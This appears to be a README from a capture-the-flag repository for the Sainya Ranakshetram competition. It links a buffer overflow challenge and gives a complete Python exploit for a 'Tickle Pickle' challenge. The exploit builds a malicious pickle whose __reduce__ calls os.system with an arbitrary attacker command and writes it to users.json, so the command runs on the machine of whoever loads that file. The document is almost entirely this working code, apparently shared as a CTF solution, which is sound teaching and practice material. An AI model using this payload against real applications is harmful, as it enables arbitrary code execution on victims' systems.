# sainya-ranakshetram-challenges-
Buffer Over Flow , Tickle Pickle

# BufferOverFlow :

## [Buffer-Overflow.zip](https://github.com/G0urav007/sainya-ranakshetram-challenges-/files/7604150/Buffer-Overflow.zip)


# Tickle Pickle :

##
exploit.py

#!/usr/bin/env python3

import os
import pickle
import argparse

 Thanks https://davidhamann.de/2020/04/05/exploiting-python-pickle/
class Exploit:
    def __init__ (self, command):
        self.command = command

    def __reduce__ (self):
        return (os.system, (self.command, ), )

def exploit ():
    parser = argparse.ArgumentParser('Exploit for TicklePickle Sainya Ranakshetram CTF')
    parser.add_argument('--command', help = 'Command to execute by attacker on client\'s machine', required = True, type = str)

    args = parser.parse_args()

    with open('users.json', 'wb') as file:
        pickled = pickle.dumps(Exploit(args.command))
        file.write(pickled)

if __name__ == '__main__':
    exploit()
    
 Thank you ..
